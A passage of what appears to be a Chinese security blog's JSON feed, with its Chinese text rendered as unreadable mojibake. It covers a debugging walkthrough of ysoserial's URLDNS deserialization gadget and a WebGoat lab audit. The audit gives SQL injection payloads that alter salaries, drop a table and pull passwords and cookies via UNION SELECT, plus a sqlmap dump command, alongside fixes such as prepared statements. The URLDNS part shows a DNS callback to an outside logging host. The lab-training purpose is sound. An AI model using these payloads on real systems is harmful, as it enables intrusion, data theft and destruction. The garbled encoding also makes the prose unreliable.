class=\"line\"><span class=\"comment\">         * second resolution.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SilentURLStreamHandler</span> <span class=\"keyword\">extends</span> <span class=\"title\">URLStreamHandler</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"function\"><span class=\"keyword\">protected</span> URLConnection <span class=\"title\">openConnection</span><span class=\"params\">(URL u)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">synchronized</span> InetAddress <span class=\"title\">getHostAddress</span><span class=\"params\">(URL u)</span> </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>é“¾æ¥ï¼š<a href=\"https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java\">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>\n<h1 id=\"è°ƒè¯•åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#è°ƒè¯•åˆ†æ\">#</a> è°ƒè¯•åˆ†æ</h1>\n<p>é¡¹ç›®é“¾æ¥ï¼š<a href=\"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>\n<p>æ‰“å¼€ ideaï¼Œæ‰¾åˆ° URLDNS å…¥å£ï¼šysosertial-&gt;src-&gt;main-&gt;java-&gt;ysoserial-&gt;payloads-&gt;URLDNS.java-&gt;main ()</p>\n<h2 id=\"è¿è¡Œå°è¯•\"><a class=\"markdownIt-Anchor\" href=\"#è¿è¡Œå°è¯•\">#</a> è¿è¡Œå°è¯•</h2>\n<p>ç›´æ¥è¿è¡Œ main å‡½æ•°ï¼Œå‘ç°é»˜è®¤ä¼ å…¥çš„å‘½ä»¤ä¸º calc.exe</p>\n<p>æŠ¥é”™ï¼šURL åˆå§‹åŒ–å¤±è´¥ï¼Œæ‰¾ä¸åˆ° calc.exe åè®®</p>\n<p><img src=\"1.png\" alt=\"\"></p>\n<p>æœ€åä¸€è¡ŒæŠ¥é”™ä¿¡æ¯æŒ‡å‘ main å‡½æ•°ï¼Œå€’æ•°ç¬¬äºŒè¡ŒæŠ¥é”™ä¿¡æ¯æŒ‡å‘ PayloadRunner</p>\n<p>è¯´æ˜ä¸ºä¼ å…¥å‚æ•° args æœ‰è¯¯ï¼Œåº”ä¸º URLï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è¦å‘é€è¯·æ±‚çš„åœ°å€</p>\n<p>æ‰“å¼€ dnslogï¼Œè·å–åˆ°åœ°å€ä¸ºï¼š<a href=\"http://ghtzjz.dnslog.cn\">ghtzjz.dnslog.cn</a></p>\n<p><img src=\"2.png\" alt=\"\"></p>\n<p>ç¼–è¾‘ä¼ å…¥å‚æ•°ï¼Œ<a href=\"http://ghtzjz.dnslog.cn\">http://ghtzjz.dnslog.cn</a></p>\n<p><img src=\"3.png\" alt=\"\"></p>\n<p><img src=\"4.png\" alt=\"\"></p>\n<p>å†æ¬¡è¿è¡Œ main ()ï¼Œpayload ä¸ºæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°</p>\n<p><img src=\"5.png\" alt=\"\"></p>\n<p>åˆ·æ–° dnslog çš„è¯·æ±‚è®°å½•ï¼Œå‘ç°æ¥æ”¶åˆ°äº†è¯·æ±‚ï¼Œåˆ©ç”¨æˆåŠŸ</p>\n<p><img src=\"6.png\" alt=\"\"></p>\n<h2 id=\"ä»£ç è°ƒè¯•\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç è°ƒè¯•\">#</a> ä»£ç è°ƒè¯•</h2>\n<p>æˆ‘ä»¬ä» main å‡½æ•°ä¸€æ­¥ä¸€æ­¥è°ƒè¯•ï¼Œä¼šå‘ç° URLDNS åœ¨ main ä¸­è°ƒç”¨ PayloadRunner#run ()</p>\n<p>ç„¶å PayloadRunner#run () ä¸­è°ƒç”¨ URLDNS#getObject ()</p>\n<p>URLDNS#getObject () ä¸­çš„ HashMap <strong>ht</strong> å°±æ˜¯æˆ‘ä»¬è¦ç”Ÿæˆçš„ï¼ˆæœªåºåˆ—åŒ–ï¼‰payload</p>\n<p><img src=\"13.png\" alt=\"\"></p>\n<p>getObeject æ–¹æ³•ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ª URL å¯¹è±¡ï¼ˆå­˜å‚¨æˆ‘ä»¬è¾“å…¥çš„ dns åœ°å€ï¼‰â€“&gt; å†å°† URL å¯¹è±¡æ”¾å…¥ HashMap ä¸­</p>\n<p>ä¸‹é¢ä¸€è¡Œçš„æ³¨é‡Šå†™é“ï¼Œåœ¨ä¸Šé¢çš„ put è¿‡ç¨‹ä¸­ï¼Œè®¡ç®—å¹¶ç¼“å­˜äº† URL çš„ hashCode; è¿™å°†é‡ç½®å®ƒï¼Œä»¥ä¾¿ä¸‹æ¬¡è°ƒç”¨ hashCode æ—¶å°†è§¦å‘ DNS æŸ¥æ‰¾</p>\n<p>é‚£ä¹ˆåœ¨ ht.put æ—¶ï¼Œæˆ‘ä»¬è¿›å…¥ HashMap æŸ¥çœ‹ï¼Œå‘ç° key è¿›è¡Œäº† hash è®¡ç®—</p>\n<p>ï¼ˆè¿™é‡Œæ’æ’­ä¸€æ¡å°é“æ¶ˆæ¯ï¼Œç‚¹å‡»è¿™ä¸ªè°ƒè¯•å¯ä»¥è¿”å›ä¸Šä¸€æ­¥<img src=\"14.png\" style=\"zoom:90%;\" />)</p>\n<p><img src=\"15.png\" alt=\"\"></p>\n<p>åœ¨è¿™é‡Œå°±æ˜¯æˆ‘ä»¬çš„ URL å¯¹è±¡è¿›è¡Œäº† hash è®¡ç®—</p>\n<p>hash è®¡ç®—å‰çš„ URL å¯¹è±¡ï¼š</p>\n<p><img src=\"16.png\" alt=\"\"></p>\n<p>hash è®¡ç®—åçš„å¯¹è±¡ï¼ˆå°±æ˜¯å¯¹è±¡ä¸­çš„ hashCode å˜é‡å‘ç”Ÿäº†å˜åŒ–å˜›ï¼‰ï¼š</p>\n<p><img src=\"19.png\" alt=\"\"></p>\n<p>è¿›å…¥ä¸‹ä¸€è¡Œä»£ç ï¼ŒReflections.setFieldValue æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>\n<p>çœ‹åå­—å°±æ˜¯ä¸€ä¸ªé€šè¿‡åå°„è®¾ç½®æˆå‘˜å˜é‡å€¼çš„åŠŸèƒ½ğŸ˜€</p>\n<p>è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œæ˜¯è¦è®¾ç½®ä¼ å…¥å¯¹è±¡çš„æˆå‘˜å˜é‡ hashCode çš„å€¼</p>\n<p><img src=\"17.png\" alt=\"\"></p>\n<p>æŸ¥çœ‹å˜é‡å€¼ï¼Œä¼ å…¥å¯¹è±¡æ˜¯åŒ…å« payload çš„ URL å¯¹è±¡ï¼Œè¦å°†å®ƒçš„ hashCode å€¼è®¾ç½®ä¸º - 1</p>\n<p><img src=\"18.png\" alt=\"\"></p>\n<p>æ‰§è¡Œå®Œè¿™è¡Œä»£ç ï¼Œå‘ç°å˜é‡ u å’Œ ht ä¸­å­˜å‚¨çš„ URL å¯¹è±¡çš„ hashCode å€¼éƒ½å˜ä¸º - 1 äº†</p>\n<p><img src=\"20.png\" alt=\"\"></p>\n<p>ç„¶åè¿”å› htï¼Œä¹Ÿå°±æ˜¯æ›´æ”¹è¿‡å­˜å‚¨ key çš„ hashCode å€¼çš„ HashMap</p>\n<p>å†æ¬¡è¿›å…¥ PalodRunner#runï¼Œè¿”å›çš„ HashMap èµ‹å€¼ç»™ objBeforeï¼Œå†å°†å…¶åºåˆ—åŒ–èµ‹å€¼ç»™ ser</p>\n<p><img src=\"21.png\" alt=\"\"></p>\n<p>Utils.releasePayload (payload, objBefore) åº”è¯¥æ˜¯é‡Šæ”¾èµ„æºçš„ä»£ç ï¼ˆä¸ç”¨åœ¨æ„ï¼Œå’Œæœ€åè¿”å›å€¼æ— å…³ï¼‰</p>\n<p>æœ€åè¿”å› serï¼Œå³å°† ser å€¼èµ‹ç»™å˜é‡ serializedï¼Œæ‰€ä»¥ serialized å°±æ˜¯åºåˆ—åŒ–åçš„ payload</p>\n<p><strong>ç»ˆäºï¼å¼€å§‹ååºåˆ—åŒ–è§¦å‘æ¼æ´äº†ï¼</strong></p>\n<p>ä»è¿™é‡Œè¿›å…¥ååºåˆ—åŒ–å‡½æ•°</p>\n<p><img src=\"22.png\" alt=\"\"></p>\n<p>ä»£ç æ³¨é‡Šä¸­è¯´æ˜ï¼Œ<strong>åˆ©ç”¨é“¾ä» HashMap#readObject () è¿›å…¥ï¼Œç›´åˆ°è¿›å…¥ URL#hashCode () è§¦å‘ DNS è¯·æ±‚</strong></p>\n<blockquote>\n<p>Gadget Chain:</p>\n<ul>\n<li>\n<pre><code>HashMap.readObject()\n</code></pre>\n</li>\n<li>\n<pre><code>HashMap.putVal()\n</code></pre>\n</li>\n<li>\n<pre><code>HashMap.hash()\n</code></pre>\n</li>\n<li>\n<pre><code>URL.hashCode()\n</code></pre>\n</li>\n</ul>\n</blockquote>\n<p>é‚£æˆ‘ä»¬å°±ä¸€ç›´ç‚¹ç‚¹ç‚¹ç›´æ¥çœ‹è§ readObject</p>\n<p>å¥½äº†è¿‡äº†æ²¡çœ‹è§å˜¤å˜¤å˜¤</p>\n<p>ç›´æ¥å» Hash#readObject å¤„ä¸‹ä¸ªæ–­ç‚¹</p>\n<p><img src=\"23.png\" alt=\"\"></p>\n<p>å¾€ä¸‹ç¿»ç¿»å°±ä¼šçœ‹è§ä¸€æ®µä»£ç ï¼Œåˆçœ‹è§äº†ç†Ÿæ‚‰çš„å•è¯ï¼Œhash</p>\n<p><img src=\"24.png\" alt=\"\"></p>\n<p>æ ¹æ®åˆ©ç”¨é“¾æˆ‘ä»¬å¯çŸ¥è§¦å‘æ¼æ´çš„ hashCode () å°±åœ¨ hash () ä¸­ï¼Œæˆ‘ä»¬è¿›å…¥è¯¥å‡½æ•°</p>\n<p><img src=\"25.png\" alt=\"\"></p>\n<p>åˆ°è¾¾ URL#hashCodeï¼Œæœç„¶å…¶ä¸­æœ‰ key.hashCode ()</p>\n<p>å› ä¸ºæˆ‘ä»¬åœ¨æ„é€  payload æ—¶å°† hashCode èµ‹å€¼ä¸º - 1ï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ if è€Œæ˜¯æ‰§è¡Œä¸‹é¢çš„ä»£ç </p>\n<p>è°ƒç”¨ URLStreamHandler#hashCode</p>\n<p><img src=\"26.png\" alt=\"\"></p>\n<p>è¿›å…¥ URLStreamHandler#hashCode</p>\n<p>æ ¹æ® p ç¥çš„æ–‡ç« æ‰€è¨€ï¼ŒgetHostAddress ä¸­æœ‰ä¸€è¡Œä»£ç </p>\n<blockquote>\n<p>InetAddress.getByName(host) ;</p>\n</blockquote>\n<p>å…¶ä½œâ½¤æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶ IP åœ°å€ï¼Œåœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNS æŸ¥è¯¢ï¼Œæ•´ä¸ªè§¦å‘è¿‡ç¨‹å°±å·²ç»å®Œæˆå•¦</p>\n<p><img src=\"27.png\" alt=\"\"></p>\n<p><img src=\"28.png\" alt=\"\"></p>\n<p>åé¢ç»§ç»­è·Ÿè¿›å°±æ˜¯åœ°å€çš„å…·ä½“æŸ¥è¯¢è¿‡ç¨‹äº†ï¼Œæ— äº†æ— äº†</p>\n<p>ä¸‹å›¾æ˜¯æ¼æ´è§¦å‘çš„è°ƒç”¨æ ˆ</p>\n<p><img src=\"29.png\" alt=\"\"></p>\n<h1 id=\"æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“\">#</a> æ€»ç»“</h1>\n<p><strong>payload æ„é€ </strong></p>\n<p>å°†æˆ‘ä»¬è¾“å…¥çš„ dns åœ°å€å­˜å‚¨åœ¨ URL å¯¹è±¡ä¸­ -&gt; å°† URL å¯¹è±¡ä½œä¸º key å­˜å‚¨åœ¨ HashMap ä¸­ -&gt; ç”±äºä½œä¸º key å€¼ï¼Œåœ¨ put æ—¶ä¼šè¿›è¡Œ hash è®¡ç®—ï¼Œé‚£æˆ‘ä»¬å°±é€šè¿‡åå°„æ›´æ”¹å…¶ hashCode å€¼ä¸º - 1</p>\n<p><strong>æ¼æ´è§¦å‘</strong></p>\n<p>ååºåˆ—åŒ– HashMap æ—¶ï¼Œä¼šè°ƒç”¨ hash () è®¡ç®— key çš„ hash å€¼ -&gt; è®¡ç®—æ—¶ï¼Œè°ƒç”¨ (URL å¯¹è±¡) key#hashCode () -&gt; ç”±äºæˆ‘ä»¬å°†è¯¥å¯¹è±¡çš„ hashCode å€¼è®¾ç½®ä¸º - 1ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨ handler.hashCode () -&gt; å…¶ä¸­è·å–åœ°å€çš„ä»£ç ï¼Œ <code> InetAddress addr = getHostAddress(u);</code>  å®é™…ä¸Šå°±æ˜¯ä¸€æ¬¡ DNS æŸ¥è¯¢</p>\n<p><strong>å°å½©è›‹</strong></p>\n<p>åœ¨æ„é€  payloadï¼Œht.put () æ—¶ï¼Œç”±äº URL çš„ hashCode å€¼ä¸º - 1ï¼Œæ‰€ä»¥åŒæ ·ä¼šè°ƒç”¨ handler.hashCode () è§¦å‘ DNS æŸ¥è¯¢ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åªèƒ½è·å–åˆ°ä¸€æ¡ dns æŸ¥è¯¢è®°å½•ï¼Œè€Œä¸æ˜¯ä¸¤æ¡å‘¢ï¼Ÿ</p>\n<p>ç›´æ¥åœ¨ DNS æŸ¥è¯¢å¤„ä¸‹æ–­ç‚¹</p>\n<p>ç”Ÿæˆ payload æ—¶ï¼Œè¿›å…¥ URLStreamHandler#hashCode æŸ¥çœ‹å½“å‰å˜é‡</p>\n<p><img src=\"31.png\" alt=\"\"></p>\n<p>ååºåˆ—åŒ–æ—¶ï¼Œè¿›å…¥ URLStreamHandler#hashCode æŸ¥çœ‹å½“å‰å˜é‡</p>\n<p><img src=\"32.png\" alt=\"\"></p>\n<p>å¯ä»¥å‘ç°è·å–åˆ°çš„ addr æœ‰å€¼äº†ï¼Œä¸º <code>åŸŸå/127.0.0.1</code></p>\n<p>é‚£ä¹ˆåŒæ ·æ˜¯å°† <code>http://ysmzza.dnslog.cn</code>  ä¼ å…¥ <code>getHostAddress(u)</code>  å¾—åˆ°çš„ç»“æœå´ä¸ä¸€æ ·å‘¢ï¼Ÿ</p>\n<p>é‚£ä¹ˆæˆ‘ä»¬å†è¿›å…¥ <code>getHostAddress(u)</code>  è¿›è¡Œå¯¹æ¯”</p>\n<p>æ„é€  payload è¿›å…¥ <code>getHostAddress(u)</code>  æ—¶ï¼Œå¦‚ä¸‹å›¾</p>\n<p><img src=\"33.png\" alt=\"\"></p>\n<p><img src=\"34.png\" alt=\"\"></p>\n<p>è¿™é‡Œè°ƒç”¨çš„ SilentURLStreamHandler#getHostAddress ç›´æ¥è¿”å›çš„ null</p>\n<p>æ³¨é‡Š:</p>\n<blockquote>\n<p>è¿™ä¸ª URLStreamHandler å®ä¾‹ç”¨äºåœ¨åˆ›å»º URL å®ä¾‹æ—¶é¿å…ä»»ä½• DNS è§£æã€‚ DNS è§£æç”¨äºæ¼æ´æ£€æµ‹ã€‚é‡è¦çš„æ˜¯ä¸è¦åœ¨ä½¿ç”¨åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰æ¢æµ‹ç»™å®šçš„ URLã€‚æ½œåœ¨çš„è¯¯æŠ¥ï¼šå¦‚æœé¦–å…ˆä»æµ‹è¯•è®¡ç®—æœºè§£æ DNS åç§°ï¼Œåˆ™ç›®æ ‡æœåŠ¡å™¨å¯èƒ½ä¼šè·å¾—ç¼“å­˜å‡»ä¸­ç¬¬äºŒä¸ªå†³è®®ã€‚</p>\n</blockquote>\n<p>è€Œåœ¨æˆ‘ä»¬ååºåˆ—åŒ–åè¿›å…¥ <code>getHostAddress(u)</code> ï¼ŒURL å¯¹è±¡ä¸­çš„ handler å°±æ˜¯é»˜è®¤çš„ handler äº†ï¼Œå› è€Œä¼šè§¦å‘ DNS æŸ¥è¯¢</p>\n<p>æ‰€ä»¥ POC ä¸­å®šä¹‰ URLStreamHandler å†…éƒ¨ç±»ï¼Œé¿å…ç”Ÿæˆ paayload æ—¶è¿›è¡Œ DNS è§£æï¼ˆå…¶å®çœ‹æ³¨é‡Šå°±èƒ½çœ‹åˆ°ï¼Œä½†æˆ‘ä¸€å¼€æ²¡æœ‰çœ‹åˆ°è¿™é‡Œçš„ä»£ç  (à¹‘ãƒ»ÌÏ‰à¸Ì€à¹‘)  ï¼‰</p>\n<p><strong>å°é—®é¢˜</strong></p>\n<ol>\n<li>\n<p>æ¼æ´æ˜¯é€šè¿‡ URLStreamHandler#hashCode è§¦å‘çš„ï¼Œé‚£ä¹ˆè¿™ä¸ª handler æ˜¯å•¥ç©æ„ï¼Ÿ</p>\n</li>\n<li>\n<p>new URL å¯¹è±¡æ—¶ï¼Œä¸€å®šè¦ä¼ å…¥ handler æ‰èƒ½è§¦å‘æ¼æ´å—ï¼Ÿå¦‚æœä¸ä¼ å…¥ handlerï¼Œç¨‹åºè¿˜èƒ½æ­£å¸¸è¿è¡Œå—ï¼Ÿï¼ˆå› ä¸º HashMap#put æ—¶ä¼šè°ƒç”¨ URLStreamHandler#hashCodeï¼‰ä¼šæœ‰é»˜è®¤çš„ handler ç»™æˆ‘ä»¬è°ƒç”¨å—ï¼Ÿ</p>\n</li>\n</ol>\n<p>æŸ¥æŸ¥ API</p>\n<blockquote>\n<p>æŠ½è±¡ç±» <code> URLStreamHandler</code>  æ˜¯æ‰€æœ‰æµåè®®å¤„ç†ç¨‹åºçš„é€šç”¨ç±»ï¼Œæµåè®®å¤„ç†ç¨‹åºçŸ¥é“å¦‚ä½•ä¸ºç‰¹å®šåè®®ç±»å‹å»ºç«‹è¿æ¥ï¼Œå¦‚ <code>http</code>  æˆ– <code>https</code> ã€‚</p>\n<p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œ  <code>URLStreamHandler</code>  å­ç±»çš„å®ä¾‹ä¸æ˜¯ç”±åº”ç”¨ç¨‹åºç›´æ¥åˆ›å»ºçš„ã€‚  æ›´ç¡®åˆ‡åœ°è¯´ï¼Œåœ¨ç¬¬ä¸€æ—¶é—´æ„å»ºæ—¶çš„åè®®åç§°é‡åˆ° <code>URL</code>  ï¼Œé€‚å½“çš„æµåè®®å¤„ç†ç¨‹åºè¢«è‡ªåŠ¨åŠ è½½ã€‚</p>\n</blockquote>\n<p>æ‰€ä»¥æµåè®®ç¨‹åºç”¨äºä¸ºåè®®å»ºç«‹è¿æ¥ï¼Œå¹¶æ„å»ºæ—¶çš„åè®®åç§°é‡è§ URL æ—¶ï¼Œé€‚å½“çš„æµåè®®å¤„ç†ç¨‹åºè¢«è‡ªåŠ¨åŠ è½½</p>\n<p>æ‰€ä»¥å…¶å®ä¸ä¼ å…¥ handlerï¼ŒURL å¯¹è±¡ä¹Ÿä¼šè‡ªåŠ¨åŠ è½½ handler</p>\n<p>ç”±å°å½©è›‹çš„å†…å®¹å¯çŸ¥ä¼ å…¥è‡ªå®šä¹‰çš„ handler åªæ˜¯ä¸ºäº†åœ¨ç”Ÿæˆ payload æ—¶ä¸è¿›è¡Œ dns è§£æ</p>\n<h2 id=\"è°ƒè¯•é‡åˆ°çš„é—®é¢˜æœªè§£å†³\"><a class=\"markdownIt-Anchor\" href=\"#è°ƒè¯•é‡åˆ°çš„é—®é¢˜æœªè§£å†³\">#</a> è°ƒè¯•é‡åˆ°çš„é—®é¢˜ï¼ˆæœªè§£å†³ï¼‰</h2>\n<p>åœ¨å°è¯•ä»£ç è°ƒè¯•æ—¶ï¼Œå‘ç°æ— æ³•å¯ç”¨ debug</p>\n<p><img src=\"7.png\" alt=\"\"></p>\n<p>çœ‹ç¬¬ä¸€è¡Œï¼Œè¿è¡Œçš„æ˜¯ jdk8_32ï¼Œè€Œæˆ‘çš„ idea æ˜¯ 64 ä½çš„ï¼Œä¼°è®¡æ˜¯ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ï¼ˆä»¥å‰ç»å¸¸ç¢°è§ tomcat å’Œ jdk ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ï¼‰</p>\n<p>åœ¨ä¸Šæ–¹èœå•æ  file-&gt;project structure ä¸­å¯ä»¥è®¾ç½® jdk ç‰ˆæœ¬ï¼Œæ›´æ”¹ä¸º 64 ä½ jdk</p>\n<p><img src=\"8.png\" alt=\"\"></p>\n<p>ç„¶åå°±ä¼šæŠ¥é”™ï¼Œç¨‹åºåŒ… sun.rmi.server ä¸å­˜åœ¨</p>\n<p><img src=\"9.png\" alt=\"\"></p>\n<p>ä½†æ˜¯åœ¨ä½¿ç”¨ jdk8 è¿è¡Œç¨‹åºæ—¶å¹¶æ²¡æœ‰è¯¥é”™è¯¯ï¼Œctrl+click ç‚¹å‡»è¿›å…¥æŠ¥é”™ç¨‹åºåŒ…ï¼Œæ˜¯å¯ä»¥æ‰¾åˆ°åœ¨ java åŸç”Ÿåº“ä¸­çš„</p>\n<p><img src=\"10.png\" alt=\"\"></p>\n<p>ä¹Ÿå°±æ˜¯è¯´åœ¨ç¼–è¯‘ç¨‹åºçš„ classpath ä¸­æ²¡æœ‰åŒ…å«â€™sun.rmi.serverâ€™è¿™ä¸ªåŒ…</p>\n<p>æˆ‘çš„ç›´è§‰å‘Šè¯‰æˆ‘æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œå¯æ˜¯ä¸Šå›¾ä¸­ jdk11 çš„åŒ…é‡Œé¢ä¹Ÿæœ‰è¿™ä¸ªåŒ…çš„å¹¶ä¸”å·²ç»å¼•å…¥é¡¹ç›®ä¸­äº†</p>\n<p>æ‰€ä»¥æˆ‘æ¢å› jdk8_32ï¼ŒæŸ¥çœ‹ jar åŒ…çš„åŒºåˆ«</p>\n<p>jdk8ï¼š</p>\n<p><img src=\"11.png\" alt=\"\"></p>\n<p>jdk11:</p>\n<p><img src=\"12.png\" alt=\"\"></p>\n<p>éš¾é“è¿™ä¸ªä¸–ç•Œæœ‰äº›ä¸œè¥¿æˆ‘çœŸçš„ï¼Œéš¾ä»¥æ¢å¯»å—ï¼Œè¿™çœŸçš„å°±æ˜¯æˆ‘çš„æé™äº†å—ï¼Œä¸ï¼Œæˆ‘è¦å»ç™¾åº¦ï¼ï¼ç™¾åº¦æ•‘æˆ‘ï¼ï¼ï¼</p>\n<p><strong><a href=\"https://xy2401.com/local-docs/oracle/java.zh/11/migrate/#JSMIG-GUID-D7936F0D-08A9-411E-AD2F-E14A38DA56A7\">è¿™é‡Œå‘ç°</a>ï¼Œjdk11 ä¸å†æä¾› corba å·¥å…·ï¼Œrmic (RMI ç¼–è¾‘å™¨) ä¸å†æ”¯æŒ - idl æˆ– - iiop é€‰é¡¹ã€‚</strong></p>\n<p>å¯æ˜¯ java11 çš„ api é‡Œé¢æ˜¯æœ‰ rmi çš„ğŸ™</p>\n<p>æœç„¶æ¢æˆ jdk8_64 æ‰€æœ‰é—®é¢˜è¿åˆƒè€Œè§£ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®é¢˜â€¦</p>\n<p>å½“ç„¶ä¸èƒ½ç®—è§£å†³äº†ï¼Œæœªå®Œå¾…ç»­ï¼</p>\n",
            "tags": [
                "ysoserialè°ƒè¯•"
            ]
        },
        {
            "id": "http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/",
            "url": "http://example.com/2021/01/28/webgoat%E5%AE%A1%E8%AE%A1/",
            "title": "webgoatå®¡è®¡",
            "date_published": "2021-01-28T01:28:50.000Z",
            "content_html": "<h1 id=\"æ­å»ºæ¦‚è¿°\"><a class=\"markdownIt-Anchor\" href=\"#æ­å»ºæ¦‚è¿°\">#</a> æ­å»ºæ¦‚è¿°</h1>\n<p>å‰æï¼š</p>\n<ul>\n<li>Java 11</li>\n<li>Maven &gt; 3.2.1</li>\n<li>IDEA</li>\n</ul>\n<p>ä¸‹è½½æºç </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/WebGoat/WebGoat.git</span><br></pre></td></tr></table></figure>\n<p>æ‰“å¼€ idea å¯¼å…¥ maven é¡¹ç›®ï¼Œbuild å®Œæˆä¹‹åï¼Œæ‰“å¼€ localhost:8080/WebGoatï¼Œæ³¨å†Œè´¦æˆ·</p>\n<h1 id=\"sqlæ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#sqlæ³¨å…¥\">#</a> Sql æ³¨å…¥</h1>\n<p>select department from employees where first_name=â€˜Bobâ€™</p>\n<p>update employees set department=â€˜Salesâ€™ where first_name=â€˜Barnettâ€™</p>\n<p>alter table employees add column phone varchar(20)</p>\n<p>grant alter table to UnauthorizedUser</p>\n<p>12:â€™; update employees set salary=1000000 where last_name=â€˜Smithâ€™;â€“</p>\n<p>13:â€™; drop table access_log;-- -</p>\n<h2 id=\"æ¼æ´æè¿°\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°\">#</a> æ¼æ´æè¿°</h2>\n<p>å½“åº”ç”¨ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œæ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œä¸€èµ·æäº¤ç»™æ•°æ®åº“æ‰§è¡Œæ—¶ï¼Œå°±ä¼šäº§ç”Ÿ SQL æ³¨å…¥å¨èƒã€‚æ”»å‡»è€…é€šè¿‡æ§åˆ¶éƒ¨åˆ† SQL è¯­å¥ï¼Œå¯ä»¥æŸ¥è¯¢æ•°æ®åº“ä¸­ä»»ä½•éœ€è¦çš„æ•°æ®ï¼Œåˆ©ç”¨æ•°æ®åº“çš„ä¸€äº›ç‰¹æ€§ï¼Œç”šè‡³å¯ä»¥ç›´æ¥è·å–æ•°æ®åº“æœåŠ¡å™¨çš„ç³»ç»Ÿæƒé™ã€‚</p>\n<h2 id=\"æ¼æ´æˆå› \"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› \">#</a> æ¼æ´æˆå› </h2>\n<p>å­—ç¬¦æ‹¼æ¥çš„æ–¹å¼æ‹¼æ¥ sql è¯­å¥ï¼Œå¹¶ä¸”æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ç›´æ¥æ‰§è¡Œ</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<ol>\n<li>\n<p>sql-injectionâ€“&gt;SQLInjectionChanllenge</p>\n<p>ä½¿ç”¨é¢„ç¼–è¯‘ PrepareStatementï¼Œå®ç°æ•°æ®ä»£ç åˆ†ç¦»</p>\n<p><img src=\"sql1.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>æ ¹æ®ä»£ç æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œç”¨ sqlmap è·‘ï¼Œpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap.py -r 1.txt --method PUT --data &quot;username_reg&quot; -D PUBLIC -T CHALLENGE_USERS -C password --dump</span><br></pre></td></tr></table></figure>\n<p>ä½†æ˜¯å¯èƒ½ç”±äºæœåŠ¡å™¨çš„åŸå› ï¼Œè·‘äº†å¾ˆä¹…ï¼Œè¿˜è·‘é”™äº†ï¼Œå¯†ç åº”è¯¥æ˜¯ thisisasecretfortomonly</p>\n<p><img src=\"sql9.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injectionâ€“&gt;SQLInjectionLesson6a</p>\n<p>ä½¿ç”¨é¢„ç¼–è¯‘ PrepareStatementï¼Œå®ç°æ•°æ®ä»£ç åˆ†ç¦»<img src=\"sql2.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>payload (æ³¨æ„å­—æ®µç±»å‹è¦å¯¹åº”)ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27; union select userid,user_name,password, cookie,&#x27;&#x27;,&#x27;&#x27;,0 from user_system_data --</span><br></pre></td></tr></table></figure>\n<p><img src=\"sql8.png\" alt=\"\"></p>\n</li>\n<li>\n<p>sql-injectionâ€“&gt;Servers</p>\n<p>åˆ—åä¸èƒ½åŠ 